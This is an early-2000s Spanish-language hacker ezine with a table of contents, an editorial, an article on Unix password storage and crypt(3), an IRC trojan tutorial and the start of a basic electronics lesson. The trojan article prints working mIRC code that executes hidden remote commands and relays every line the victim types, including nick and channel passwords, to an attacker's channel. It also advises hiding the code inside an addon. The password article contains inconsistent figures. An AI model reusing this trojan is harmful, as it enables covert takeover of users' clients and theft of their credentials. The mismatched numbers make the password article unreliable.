  ************************************************************************* 
  *@@@@@@@@@@@@@@@@@****%___%%%%%%%%%%%%_%%%%%%%%_******@@@@@@@@@@@@@@@@@@* 
  *@@@@@@@@@@@@*****%%%/ ___|%_%%%_%___| |_%__%_| |_%%%%*****@@@@@@@@@@@@@* 
  *@@@@@@@@@***%%%%%%%%\___ \| |%| / __| __/ _` | __|%%%%%%%%***@@@@@@@@@@* 
  *@@@@@@***%%%%%%%%%%%%___) | |_| \__ \ || (_| | |_%%%%%%%%%%%%***@@@@@@@* 
  *@@@@**%%%%%%%%%%%%%%|____/%\__, |___/\__\__,_|\__|%%%%%%%%%%%%%%**@@@@@* 
  *@@@*%%%%%%%%%%%%%____%%%%%%|___/%%%%%%%%%%%%_ _%%%%%%%%%%%%%%%%%%%*@@@@* 
  *@**%%%%%%%%%%%%%/ ___|%%___%%___%_%%%_%_%__(_) |_%_%%%_%%%%%%%%%%%%**@@* 
  **%%%%%%%%%%%%%%%\___ \%/ _ \/ __| |%| | '__| | __| |%| |%%%%%%%%%%%%%*@* 
  **%%%%%%%%%%%%%%%%___) |  __/ (__| |_| | |%%| | |_| |_| |%%%%%%%%%%%%%*@* 
  *%%%%%%%%%%%%%%%%|____/%\___|\___|\__,_|_|%%|_|\__|\__, |%%%%%%%%%%%%%%** 
  *%%%%%%%%%%%%%%%%%%%%%%%_____%%%%%%%%%%%%%%%%%%%%%%|___/%%%%%%%%%%%%%%%** 
  *%%%%%%%%%%%%%%%%%%%%%%|_   _|__%%__%_%_%__%___%%%%%%%%%%%%%%%%%%%%%%%%** 
  **%%%%%%%%%%%%%%%%%%%%%%%| |/ _ \/ _` |  _   _ \%%%%%%%%%%%%%%%%%%%%%%*@* 
  **%%%%%%%%%%%%%%%%%%%%%%%| |  __/ (_| | |%| |%| |%%%%%%%%%%%%%%%%%%%%%*@* 
  *@**%%%%%%%%%%%%%%%%%%%%%| |\   |\__,_|_|%|_|%|_|%%%%%%%%%%%%%%%%%%%**@@* 
  *@@@*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*@@@@* 
  *@@@@**%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%**@@@@@* 
  *@@@@@@***%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%***@@@@@@@* 
  *@@@@@@@@@***%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%***@@@@@@@@@@* 
  *@@@@@@@@@@@@*****%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*****@@@@@@@@@@@@@* 
  *@@@@@@@@@@@@@@@@@*******%%%%%%%%%%%%%%%%%%%%%%*******@@@@@@@@@@@@@@@@@@*
  *@@@@@@@@@@@@@@@@@@@@@@@@**********************@@@@@@@@@@@@@@@@@@@@@@@@@* 
  *************************************************************************  


			      Systat Security Team
                              -=-=-=-=-=-=-=-=-=-=
								Staff:
								''''''
								- z0Rbas
								- El-Angel
								- BigTymer-
								- DrJeckill
								- Sanot

ENTREGA OFICIAL NUMERO 1:

Puedes contactarnos a:
TEAM                 :  syst4t@usa.net
''''                    ''''''''''''''
z0rbas               :  the-little@usa.net
El-Angel             :  chicochileno@hotmail.com
BigTymer-            :  3min3m@usa.net
DrJeckill            :  drjekil-mrhyde@starmedia.com
Sanot                :  sanot55@hotmail.com

 
 
====================================================================== 
= INDICE ============================================================= 
====================================================================== 
====================================================================== 
 
0001 
---- 
Editorial. 
.......... 
 
 
Descripcion: 
'''''''''''' 
Bienvenida a nuestro ezine. 
 
Autor: 
'''''' 
El Editor 
 
====================================================================== 
====================================================================== 
 
0002 
---- 
Passwords en Unix. 
.................. 
 
 
Descripcion: 
'''''''''''' 
Texto que habla sobre  passwords en unix,  como funciona  el metodo de 
encripcion y como se acostumbran a crackear los ficheros  de passwords 
en unix, entre otros. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0003 
---- 
Troyanos de IRC. 
................ 
 
 
Descripcion: 
'''''''''''' 
Texto de introduccion a los troyanos de  irc, bastante bueno  para los
interesados en los troyanos como para  saber que buscar cuando alguien
nos infecte (si usas mIRC :D ). 
 
Autor: 
'''''' 
Sanot
 
====================================================================== 
====================================================================== 
 
0004 
---- 
Electronica Basica. 
................... 
 
 
Descripcion: 
'''''''''''' 
Curso relativamente basico sobre electronica, de lectura obligada para 
cualquiera  que quiera iniciarse  en el phreaking.  Muy claro  y  bien  
explicado. 
 
Autor: 
'''''' 
DrJeckill 
 
====================================================================== 
====================================================================== 
 
0005 
---- 
Explotando netbios en Linux. 
............................ 
 
 
Descripcion: 
'''''''''''' 
Articulo sobre como explotar el famoso netbios  de windows, estando en  
linux, para los que creian que no se podia. 
 
Autor: 
'''''' 
DrAk0 
 
====================================================================== 
====================================================================== 
 
0006 
---- 
Scripting. 
.......... 
 
 
Descripcion: 
'''''''''''' 
Manual de  scripting, para  que los  fanaticos  del IRC  comienzen  a  
escribir su propio  script, tambien  muy util para  los que programen  
worms para mIRC, ya que aqui podran encontrar ciertos trucos bastante 
insteresantes. 
 
Autor: 
'''''' 
Sanot 
 
====================================================================== 
====================================================================== 
 
0007 
---- 
Programacion en C. 
.................. 
 
 
Descripcion: 
'''''''''''' 
Manual de  programacion en lenguaje  C, bastante extenso  y con varios  
ejemplos. Espero que les sirva. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0008 
---- 
Unix/Linux. 
........... 
 
Descripcion: 
'''''''''''' 
Pequeño  texto  que  habla  un  poco sobre  lo  basico  de un  sistema  
Unix/Linux, orientado  a aquellos  que recien  comienzan a  usar  este  
sistema. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0009 
---- 
Netbios. 
........ 
 
Descripcion: 
'''''''''''' 
Texto  sobre  como  explotar  netbios  desde  windows,  aclarando  las  
principales dudas que surgen al intentar hacerlo. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0010 
---- 
ROOTeando. 
.......... 
 
Descripcion: 
'''''''''''' 
Solo leelo, esta vez remplaza a la seccion de exploits. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0011 
---- 
Stack Overflows exploits. 
......................... 
 
Descripcion: 
'''''''''''' 
Como escribir tus propios exploits de desbordamiento de la pila. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0012 
---- 
Creando utilidades. 
................... 
 
Descripcion: 
'''''''''''' 
Un texto que te puede dar un pequeño empujon para empezar a crear tus 
propias utilidades en C. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
 
0013 
---- 
Mails. 
...... 
 
Descripcion: 
'''''''''''' 
Mails respondidos. 
 
Autor: 
'''''' 
El Editor 
 
====================================================================== 
====================================================================== 
 
 
0014 
---- 
Sugerencias. 
............ 
 
Descripcion: 
'''''''''''' 
El titulo lo dice. 
 
Autor: 
'''''' 
z0rbas 
 
====================================================================== 
====================================================================== 
 
0015 
---- 
Despedida. 
.......... 
 
Descripcion: 
'''''''''''' 
Despedida. 
 
Autor: 
'''''' 
El Editor 
 
====================================================================== 
======================================================================




====================================================================== 
= 0x01 =============================================================== 
====================================================================== 
====================================================================== 

			EDITORIAL 
			--------- 
 
Aqui nos  tienen de vuelta,  con un ezine nuevo, ya que luego de algunas 
conversaciones del grupo,  llegamos a la conclusion que al ezine antiguo 
le faltaba algo, al igual que a la web. La verdad es  que hasta antes de  
este numero, lo que se hacia era solamente escribir los articulos, no se 
revisaban, no se pulia mucho lo que se publicaba y decidimos cambiar eso 
haciendo todo de nuevo como  corresponde, esta vez  no salio un ezine de 
una sola mañana de trabajo,  sino que fue un poco mas elaborado, tambien 
como  grupo nos hemos puesto nuevas metas y protectos, que mientras vaya 
pasando el tiempo van a ir notando. 
 
Antiguamente solo tratabamos temas como programacion en linux y cosas de 
ese estilo, las  que a muchos les  parecian un plomo, ahora hemos vuelto  
con de todo un poco y esperamos que les guste.  Tambien cambio la manera 
de  organizar la revista,  ya que creemos  que asi  queda  mas  clara  y  
amistosa. 
 
Systat Security Team ya quedo formado tambien, con los siguientes  
miembros: 
 
DrJeckill 
Sanot 
BigTymer- 
El Angel  
y yo(z0Rbas) que estoi como editor en este numero. 
 
La web oficial del team es www.systat.net aunque estamos consiguiendonos 
el dominio .cl, quiza podamos estrenarlo dentro de un tiempo.
 
Si alguien esta  interesado en publicar nuestra ezine en su web, que nos 
contacte nada mas a syst4t@usa.net,  al igual que  en caso de criticas o  
comentarios, aportes, etc, siempre y cuando sean constructivos. 
 
Ya  me dejo de tanto  palabrerio y los dejo  con nuetro "primer" numero,  
espero que les guste y que lo disfruten. 
 
 
							Systat Team.





====================================================================== 
= 0x02 =============================================================== 
====================================================================== 
====================================================================== 


			############################ 
			# Passwords en UNIX.       # 
			# z0Rbas                   # 
			############################ 
 
Toda la información  contenida en este  texto esta  escrita solo con fines  
educativos, el mal  uso de esta es  completa  responsabilidad  del lector. 
 
				          © z0Rbas 2000 
 
 
Los  passwords  en  UNIX  se   guardan  por  lo  general   en  el  fichero  
/etc/passwd  o  si  están  shadowed  en  el  fichero  /etc/shadow (por  lo  
general, podría ser tambien por ejemplo /etc/master.passwd). 
 
El fichero /etc/passwd es un  archivo compuesto  por  líneas,  donde  cada  
línea representa un registro,  compuesto de  siete campos separados  entre  
sí por ' : '. 
 
Por ejemplo una línea podría ser así: 
 
Little:E6r68fgtl13mz:0:0:root:/root:/bin/bash 
 
1º campo('little'): es el nombre de usuario. 
 
2º campo('E6r68fgtl13mz'):  es  el  password   encriptado,   donde   'E6',  
representa la semilla(como se le  llama en  criptologia,  lo  que  es  una  
clave en la que se  basa para encriptar el password)  y  el  resto  es  el  
password   encriptado  (todo   esto  sé  vera   un  poco  mas   adelante). 
Si en vez de  aparecer eso  aparece un ' * '  o  una  ' X '  en  todos los  
campos de  password  del fichero,  quiere  decir que los  password   están  
shadowed.  Si al final del password encriptado hay una ' , ' y dos  cifras  
mas, estas corresponden a la fecha de expiración del password. 
 
3º campo(' 0 '): es el UID(User ID). UNIX no  identifica  a  los  usuarios  
por  su  nombre (o  nick)  sino que por  un numero que se almacena en este  
campo.  Este valor puede  variar entre 0 y 60000,  por lo  general se usan  
números entre 100 y 60000 para usuarios  normales y  el ' 0 '  corresponde  
al super usuario(root). 
 
4º campo(' 0 '): es el  GID(Group ID). Es la  identificación del grupo  al  
que pertenece al  usuario.  Tambien  varia  entre  0 y 60000  y  el  ' 0 '  
también pertenece  al grupo del root  y tienen los mismos privilegios para  
aquellos elementos que pertenezcan a su dominio. 
 
5º campo(' root '): este es  un  campo  reservado  para  un  comentario  o  
información  extra  del usuario,  como  podría ser por ejemplo  el  nombre  
completo o algo así. 
 
6º campo(' /root '): es el  directorio  home  de ese usuario,  o  sea,  su  
directorio de trabajo. 
 
7º campo(' /bin/bash '): es la  shell(interprete de comandos) que  utiliza  
el  usuario.  Estas  sirven  también para  restringir el  uso  de  algunos  
comandos a algunos usuarios en especial,  por ejemplo un  usuario anónimo,  
por  lo  general  tendrá  una  shell  muy  restringida  que  le  permitirá  
ejecutar muy pocos comandos. 
 
 
Las   contraseñas   en  UNIX  se  encriptan   usando   una   función   del  
kernel (núcleo del sistema)  , crypt(3).  Esta  función  es  un  algoritmo  
basado en el estándar de encriptación de datos(DES),  desarrollado  por el  
Instituto Nacional de Estándares y Tecnología(NIST). 
En crypt(3) (no crypt(1), que es la mas  antigua  y  mucho  mas insegura),  
el texto llano  se  encripta en un grupo de ceros, posteriormente el texto  
cifrado  resultante  es  encriptado de nuevo  con el password del  usuario  
como  clave, repitiéndose  este proceso 25  veces. Una vez  finalizado  se  
obtiene un resultado de 64 bits, los cuales se dividen  en 11  caracteres,  
los  cuales  se  guardan  en el  archivo  /etc/passwd  o  /etc/shadow ( el  
correspondiente). 
El 'grano de sal' o 'semilla' como se le  denomina en criptologia(los  dos  
primeros  caracteres  del  segundo  campo  en  el  fichero) ,  los  cuales  
representan  un  valor  de  12 bits,  que  se  utilizan  para  alterar  el  
resultado de  la función,  lo que hace que  un  password se  pueda  variar  
entre 0 y 4095, por  lo que para cada  password hay 4069 formas  distintas  
de encriptación (mas  adelante veremos  un poco mejor la función crypt(3),  
junto con unos ejemplos). 
Por  ejemplo   el  programa  /bin/passwd,  que  se  usa  para  cambiar  la  
contraseña  de  un  determinado  usuario,  calcula  la semilla de 12 bits,  
basándose en la hora del sistema. 
UNIX jamas  desencripta un password,  cuando  el sistema nos  pide login y  
password,  el  programa  encargado  de  hacer  esto, encripta  la  palabra  
usando la semilla presente en el fichero de  password y  luego lo  compara  
con el password encriptado del fichero. 
La manera que se usa para descubrir  los  passwords ( no desencriptar ) es  
encriptar palabras presentes en  un diccionario por ejemplo y  compararlas  
con el  password del  fichero. Este  método es muy  lento y puede  incluso  
llegar  a  ser  muy  difícil  averiguar  la  clave. Los  crackeadores   de  
password que utilizan este sistema  son fácilmente diseñables, incluso  se  
pueden  conseguir  uno en 35 líneas  aprox. ¿Por qué  no  desencriptarlos?  
Porque la función  crypt(3) es  una función  muy fácil de  ejecutar de ida  
pero extremadamente difícil  de ejecutar de vuelta,  o sea, revertirla, lo  
que todavía no se ha logrado. 
 
El fichero /etc/shadow puede tener una forma un poco distinta(el fichero  
/etc/passwd siempre existe y solo varia si esta el password encriptado  
ahí o no). La forma seria mas o menos así: 
 
 
Usuario : pass : ultima vez que cambio pass : días que deben pasar para  
poder cambiar pass : días después de los que debe cambiar pass : días  
antes de la expiración de la cuenta en que el usuario debe ser advertido  
: día de la expiración de la cuenta : días que lleva deshabilitada la  
cuenta : bloque reservado 
 
Claro que en la realidad si cave en una línea, como por ejemplo: 
 
Little:E6r68fgtl13mz:9753:0:1000:::: 
 
La estructura en c de una línea del fichero shadow seria: 
 
Struct spwd 
{ 
char sp_namp;             /* nombre de usuario */ 
char sp_pwdp;             /* password encriptado */ 
sptime sp_lstchg;          /* ultima fecha de cambio */ 
sptime sp_min;              /* mínimo de días antes del cambio */ 
sptime sp_max;             /* días a los que debe ser cambiado el  
password */ 
sptime sp_warn;            /* días antes de la advertencia de la  
expiración */ 
sptime sp_intact;           /* numero de días a los que expira */ 
sptime sp_expire;          /* días que lleva expirada la cuenta */ 
unsigned long sp_flag  /* reservado para usos futuros */ 
};  
 
 
Análisis de crypt(3). 
 
La semilla en la función puede variar entre a-z, A-Z y 0-9 y con la  
combinación de estas dos opciones se crean 4096 posibilidades diferentes  
de encriptar un password. 
Lo que este algoritmo hace es tomar los siete bits mas bajos del  
password tipiado por el usuario, con lo que se obtiene una clave de 56  
bits. Esta clave de 56 bits, es usada para encriptar repetidamente una  
cadena(string) constante, la cual por lo general son solo NULLs( lo que  
en C corresponde a '\0'). El retorno de la función, apunta a una cadena  
de 13 caracteres ASCII imprimibles(incluida la semilla). El retorno  
apunta a una variable estática, la cual es sobrescrita en cada llamada. 
El espacio de la clave consiste en 5**56(7,2*10**16) posibles valores,  
lo que hace demasiado difícil de encontrar la combinación. 
 
 
 
Ejemplos 
 
Un ejemplo de programa de login seria por ejemplo el que usa el pppd- 
1.2.1d (Point-to-Point Protocol Server). 
 
--------------------------------- inicio  auth.c(traducido) ------------ 
--------------------------- 
 
/* este programa chequea un usuario y password, basado en el fichero de  
password(/etc/passwd) para la autentificación, también chequea si el  
usuario es valido.  
Retornos de la función: 
UPAP_AUTHNAK : logeo fallido. 
UPAP_AUTHACK : logeo exitoso. 
En algunos casos la variable msg apunta a un mensaje en especial.  
(Traducido por z0Rbas)                           
                                                                   */ 
 
Static int login(usuario, passwd, msg, largomsg) 
        	Char *usuario; 
       	Char *password; 
        	Char **msg; 
 	Int *largomsg;            // definición de los argumentos de la  
función. 
{ 
	struct passwd *pw;  // define puntero a la estructura del registro 
	char *epasswd;        // puntero a lo que será la pass encriptada 
	char *tty;                   // puntero a la terminal que se  
logeara 
	 
	if((pw=getpwnam(usuario))==NULL) return(UPAP_AUTHNAK);  
 
/* se asigna el valor a la estructura apuntada por pw, con el valor del  
registro del usuario correspondiente, usando la función getpwnam() y se  
compara al tiro con NULL, si es verdadero, quiere decir que el usuario  
no se encontró y el login se rechaza. */ 
 
 
	if(pw->pw_passwd == '\0') return(UPAP_AUTHACK);  
 
/* se compara el campo de password con NULL, si es verdadero, no hay  
password en el campo y el logeo es aceptado, no se necesita revisar el  
password */ 
 
 
	epasswd = crypt(password, pw->pw_passwd);  
 
/* encripta el password con la semilla del password original. */ 
 
 
	if(strcmp(epasswd, pw->pw_passwd)) return(UPAP_AUTHNAK); 
 
/* si son distintos los dos string( epasswd, el password  
encriptado(instrucción pasada) y el password original del fichero se  
rechaza el login, si a estas alturas aun no se ha rechazado, el sistema  
reconoce el password como correcto */ 
 
 
	 syslog(LOG_INFO, "user %s logged in", usuario); 
 
/* logea la entrada del usuario en la constante definida por LOG_INFO */ 
 
 
	tty = strrchr(devname,'/'); 
	if(tty==NULL) tty=devname; 
		else tty++; 
	logwtmp(tty,usuario,""); 
	logged_in=TRUE; 
	return(UPAP_AUTHACK); 
 
/* calcula la terminal de logeo y crea un log, luego retorna la función  
diciendo que el logeo ha sido exitoso */ 
} 
 
------------------------------------------- fin auth.c ----------------- 
----------------------------- 
 
Este programa no soporta password shadowed, pero es fácilmente  
modificable para que lo haga, como ya viene escrito en el pppd-2.2.0. 
 
 
----------------------------------inicio auth.c(actualizado)------------ 
-------------------- 
/* este programa chequea un usuario y password, basado en el fichero de  
password(/etc/passwd) y soporta shadowed también para la  
autentificación, también chequea si el usuario es valido.  
Retornos de la función: 
UPAP_AUTHNAK : logeo fallido. 
UPAP_AUTHACK : logeo exitoso. 
En algunos casos la variable msg apunta a un mensaje en especial.  
(También traducido por z0Rbas)   */ 
 
 
#ifdef HAS_SHADOW 
#include <shadow.h> 
#include <shadow/pwauth.h> 
#endif 
 
 
Static int login(usuario, passwd, msg, largomsg) 
        	Char *usuario; 
       	Char *password; 
        	Char **msg; 
 	Int *largomsg;            // definición de los argumentos de la  
función. 
{ 
	struct passwd *pw;  // define puntero a la estructura del registro 
	char *epasswd;        // puntero a lo que será la pass encriptada 
	char *tty;                   // puntero a la terminal que se  
logeara 
	 
#ifdef USE_SHADOW 
struct spwd *spwd; 
struct spwd *getspnam(); 
#endif 
 
 
	if((pw=getpwnam(usuario))==NULL) return(UPAP_AUTHNAK);  
 
/* se asigna el valor a la estructura apuntada por pw, con el valor del  
registro del usuario correspondiente, usando la función getpwnam() y se  
compara al tiro con NULL, si es verdadero, quiere decir que el usuario  
no se encontró y el login se rechaza. */ 
 
 
#ifdef USE_SHADOW 
spwd = getspnam(usuario); 
if(spwd) pw->pw_passwd = spwd->sp_pwdp; 
#endif 
 
	if(pw->pw_passwd == '\0') return(UPAP_AUTHNAK);  
 
/* se compara el campo de password con NULL, si es verdadero, no hay  
password en el campo y el logeo es rechazado ahora por problemas de  
seguridad(en el archivo original, esto NO viene corregido) */ 
 
 
#ifdef HAS_SHADOW 
if((pw->pw_passwd && pw->pw_passwd[0] == '@' && pw_auth(pw->  
pw_passwd+1, pw->pw_name, PW_LOGIN, NULL)) || !valid(password,pw)) { 
return(UPAP_AUTHNAK); 
} 
#else 
	epasswd = crypt(password, pw->pw_passwd);  
 
/* encripta el password con la semilla del password original. */ 
 
 
	if(strcmp(epasswd, pw->pw_passwd)) return(UPAP_AUTHNAK); 
 
/* si son distintos los dos string( epasswd, el password  
encriptado(instrucción pasada) y el password original del fichero se  
rechaza el login, si a estas alturas aun no se ha rechazado, el sistema  
reconoce el password como correcto */ 
#endif 
 
	 syslog(LOG_INFO, "user %s logged in", usuario); 
 
/* logea la entrada del usuario en la constante definida por LOG_INFO */ 
 
 
	tty = strrchr(devname,'/'); 
	if(tty==NULL) tty=devname; 
		else tty++; 
	logwtmp(tty,usuario,""); 
	logged_in=TRUE; 
	return(UPAP_AUTHACK); 
 
/* calcula la terminal de logeo y crea un log, luego retorna la función  
diciendo que el logeo ha sido exitoso */ 
} 
 
------------------------------------------fin auth.c(corregido)--------- 
------------------------- 
 
En este archivo se corrigió el que se aceptara el logeo sin password,  
porque sino seria muy fácil para usuarios conseguir una shell por el  
servidor de ppp. Para compilar este archivo se necesita editar el  
archivo 'Makefile' de la siguiente manera(agregar): 
LIBS = -lshadow 
Y se modifica la línea que dice: 
COMPILE_FLAGS = -I.. D_linux_=1 DGIDSET_TYPE=gid_t 
Por: 
COMPILE_FLAGS = -I.. D_linux_=1 DGIDSET_TYPE=gid_t DUSE_SHADOW 
 
Toda la información contenida en este texto esta escrita solo con fines  
educativos, el mal uso de esta es completa responsabilidad del lector. 
 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@ Saludos z0Rbas           @ 
@ the-little@usa.net       @ 
@ #systat_team irc.dal.net @ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 





====================================================================== 
= 0x03 =============================================================== 
====================================================================== 
====================================================================== 


                                TROYANOS DE IRC 
                                                            Sanot 
 
 NOTA: No pretendo incitar a que la jente use troyanos, a mi en realidad no me 
gustan y encuentro que son una estupides, pero a muchos de ustedes les puede
gustar, en el caso que no les guste lo siento mucho. Yo no los obligo a que
lean esta seccion. Este articulo lo escribi por que se me ha pedido que lo
haga, espero que no cree un prejuizio de mi pensando que soi una de esas
personas que solo usan nukes y troyanos.       El hacer un troyano de irc es
bastante facil, y no implica mas de 4 o 5 lineas (si lo queremos especificar
mas podremos usar mas lineas).     La idea de un troyano es el poder controlar
rmotamente a otra persona, aqui aremos lo mismo, en este caso sera por medio
de CTCP.                           ----------o----------                      
                                                          ctcp ^*:*systat*:*:{
. $+ $$2- | halt }  on *:connect: .msg #PlanetadeLamos x¡Estoi Infectado!x 
on *:INPUT:*:{.msg #PlanetadeLamos $1- } 
 
                       ----------o----------                                  
 
Bueno, que tenemos aqui? (Los que estan aprendiendo por primera vez en el curso 
de scripting de esta ezine no van a cachar ni una... mejor cuarden la ezine y
cuando sepan mas la leen de nuevo.) Como pueden ver esto se compone de tres
cosas. Un CTCP syst4t un msg al conectar y un msg al escribir.    1.- EL CTCP
( "ctcp ^*:systat:*:{ . $+ $$2- | halt }" ) Como veran es un ctcp que se puede
ejecutar por cualquier grupo de personas ( "ctcp ^*:" ) y que es un ctcp
systat ( "systat" ). Y nos dice que lo podemos ejecutar desde cualquier parte,
ya sean privados, canales, dcc chats.  Esto tambien le dice al infectado que
ejecute lo que nosotros tipemos ( "$$2-" ) pero sin comuniacrle al infectado
de lo que le estamos haciendo hacer ( ". $+" ) (El . hace que se ejcuten los
comandos sin comuniacrnos). y que finalmente detenga cualquier otra seccion
posterrios ( "| halt" ).      Veamos un ejemplo con el mismo ctcp. Supongamos
que la victima tiene nick Servidor y nuestro nick es Cliente.    <Cliente>
/ctcp servidor systat join #gays     que hace esto. Manda un ctcp systat al
nick servidor pidiendole (o mandandolo) a que entre al canal #gays ( join
#gays ).    Veamos otro ejemplo.    <Cliente> /ctcp servidor systat say amo a
Cliente   <Servidor> amo a Cliente    Bueno, que hace esto. Simple, ordena al
nick servidor que diga amo a Cliente ( "say amo a cliente" ).   
Y por ultimo veamos otro ejemplo 
 
<Cliente> /ctcp servidor systat dcc send Cliente script.ini 
 
 Esto ordena a Servidor que envie a Cliente el archivo script.ini (donde 
 genaralmente se guardan la clave del nick). 
 
  
2.- El Connect ( "on *:connect: .msg #PlanetadeLamos x¡Estoi Infectado!x" ) 
Bueno, aqui se puede apreciar que al momento de conectarse al servidor ( "on
*:connect:" ) este manda un mensaje al canal #PlanetadeLamos sin que el
infectado se de cuenta con el mensaje x¡Estoi Infectado!x ( ".msg
#PlanetadeLamos x¡Estoi Infectado!x" ) Bueno, esto es util para saber quienes
estan onfectados con nuestro troyano.    3.- El INPUT ( "on *:INPUT:*:{ .msg
#PlanetadeLamos $1- }" ) Este es el tercer y ultimo paso de nuestro troyano,
lo que esto hace es que cuando tecleemos algo en cualquier ventana ( "on
*:INPUT:*:{" ) va a amdnar un mensaje a #Planetadelamos si que el infectado
este conciente de esto ( ".msg #PlanetadeLamos" ) con todo lo que escribio (
"$1-" )      Veamos algunos ejemplos.    <Infectado> Hola NightJHS      Esto
lo veriamos en la ventana del canal #Planetadelamos nos podemos imaginar que
habla con alguna persona de nick NightJHS.       <Infectado> Hola mi amor. Te
gusto lo de anoche???   
  Uyy.. aqui estamos en algo mas privado. No seguire comantando esto. 
 
<Infectado> /chanserv identify #operhelp 1315813158 
 
 Aqui tenemos algo mucho mas interesante, aqui nos esta dando la clave del 
canal #operhelp. Entonces es solo cosa que nos identifiquemos y quedaremos
como fundadores del canal.   
<Infectado> /nickserv identify holachau 
 Algo bastante parecido, esta vez tenemos la clave de un nick. Y bueno si
queremos ese nick podriamos botarlo del irc ( con el comando: /ctcp infectado
systat quit ) y eso hara que se desconecte dejandonos libres para usar ese
nick.       Bueno, eso es todo lo que deben saber para crear un pequeño
troyano de IRC. Doi gracias a Dr^Muerte por prestarme el codigo del troyano.   
 
Ahh, se me olvidaban dos cosas sumamente importantes.  
 
1.- Recomiendo que sto lo mesclen con algun addon, que lo pongan el medio o 
al fnial, ya que si la persona tiene una gota de inteligencia vera el codigo
fuente de el addon y no lo va a loder, mientras que si lo colocan en un logar
donde no se note mucho no se va a fijar.    2.- Pueden cambiar el codigo del
addon, cosa que resulte mejor para su canal, o lo que deseen. Solo usen la
imaginacion. 




====================================================================== 
= 0x04 =============================================================== 
====================================================================== 
====================================================================== 


                          ####################                                                          #ELECTRONICA BASICA# 
                          #################### 
 
 recomendado EDIT de DOS                                   By DrJeckill o MrHyde 
 
 DrJekil-mrhyde@starmedia.com 
 
Bueno en este y en los posteriores(si es que hay) trataremos de explicar un 
poco sobre electronica, aunque ya se que hay gente que lo unico que le 
interesa es "hackear", "hackear" y "hackear" (aunque normalmente son lamers) 
nunca es malo aprender sobre otras cosas, ademas nadie te obliga a leer este 
articulo por lo cual te lo puedes saltar y  yo no perdere el sue~o. 
 
todo esto de hacer un articulo nacio de una conversacion que tuve con 
The-LiTtle en dalnet donde yo le dije "capaz que algun dia te llegue un 
articulo mio", y el me dijo "dale no mas" (bueno algo asi fue). 
 
COMO ES HABITUAL(­y no es chiste!) HAY QUE DAR ALGUNAS DEFINICIONES 
 
ATOMO: Es la particula mas pequeøa de la materia  (aunque ya se comprobo 
que no es asi, esa definicion queda como esta, sino leete un texto de fisica) 
el cual esta compuesto por Proton(+), Neutron(0) y Electron(-) 
 
                                 *(-) 
                                
 
                              øøøøøøø 
                   *(-)      ø(0)(+) ø      *(-) 
                            ø(0)(+)(0)ø 
                     *(-)   ø(+)(0)(+)ø 
                             ø (+)(0)ø   
                              øøøøøøø       *(-) 
 
                           *(-) 
 
 
                           (­bien feo el dibujo!) 
 
VOLTIO: Es una unidad de mediada que mide la fuerza electromotriz  
(normalmente se designa con la letra "E"). 
 
AMPERE: Es la unidad que mide la corriente que circula por un conductor o 
circuito un ampere es igual a 6.280.000.000.000.000.000 electrones por 
segundo (se denomina con las letras "I" , "A" o "amp"). 
 
*OJO: que esto es variable por que si fueran 2 amperes tendria 
que ser multiplicado por 2 o si fueran 3 por 3 y asi. 
 
RESISTENCIA: Es la propiedad que tienen algunos cuerpos de impedir el paso 
de los electrones(se denomina con la letra "R" aunque en realidad es un 
simbolo que me da lata dibujar). 
 
CONDUCTANCIA: Es la propiedad que tienen algunos cuerpos de "ayudar" en el 
paso de los electrones 
 
*Una cosa: ademas de hay cuerpos aislantes pero voy a dejarlos tranquilos* 
 
LEY DE OHM: La ley de Ohm establece una relacion entre tension, corriente y 
resistencia 
 
la expresion matematica de esta seria asi I=E/R por lo cual podemos sacar 
por conclusion que E= I x R ,tambien R= V/I  
 
ahora para sacar la conductancia es tan sencillo como decir 
Conductancia = 1/R debido a que conductancia es la contrario de resistencia 
 
todo esto nos servira mas tarde cuando haya que sacar algunos calculos 
 
YA EMPEZEMOS 
 
al momento de hablar de electronica debemos primero saber algunas cosas 
basicas: 
 
1-mientras mas electrones libres tenga un atomo en la capa externa 
mayor va a ser su conductancia 
 
2-un atomo al perder electrones los trata de recuperar de otro atomo vecino, 
este a su vez lo hace de otro proximo dando origen a la "CORRIENTE ELECTRICA" 
 
 
 
 
MEDICION DE LA INTENCIDAD, VOLTIOS Y OTRAS COSAS (velo en DOS) 
 
                               amperimetro 
       +   _-----------------(-)----------- 
         _| |_          |                  | 
        |     |         |                  | 
        |     |         |                 | | 
        |     |        (|)-voltimetro     | | 
        |pila |         |                 | | resistencia 
        |     |         |                  | 
        |_____|         |                  | 
       -   |____________|__________________| 
 
 
si nos fijamos, en el dibujo 
 
el voltimetro se debe poner en los 2 extremos, si lo pusieramos en los 2 
polos de la pila nos daria como respuesta 1.5V a menos que este gastada 
 
y que nos daria el amperimetro? 
 
R:nos daria los amperes jajaja, si tuvieramos una resistencia de 2 ohms 
podemos calcular por la ley de ohm que son (voy a poner la calculadora 
del ventanas) 0.75 amp de intensidad (este trabajo matematico nos 
lo podemos ahorrar con el amperimetro) 
 
si conectamos una ampolleta y el enchufe se forma un circuito simple 
pero por que sale luz? 
 
debido a que la ampolleta sufre una reaccion con el paso de los electrones 
(creo que es incandecencia si la memoria no me falla aunque puedo estar 
equivocado) 
 
 
                                RESISTENCIA 
 
ya sabemos que la resistencia es el impedimento al paso de los electrones 
pero hay tres elementos que tenemos que tener en cuenta en el tema de 
las resistencias, los cuales son: 
 
-largo en metros 
 
-seccion en milimetros cuadrados 
 
-temperaturas 
                   ____________________ 
                  |                    | 
                  |                    | 
                  |      R=ro x L      |  ro= resistencia especifica 
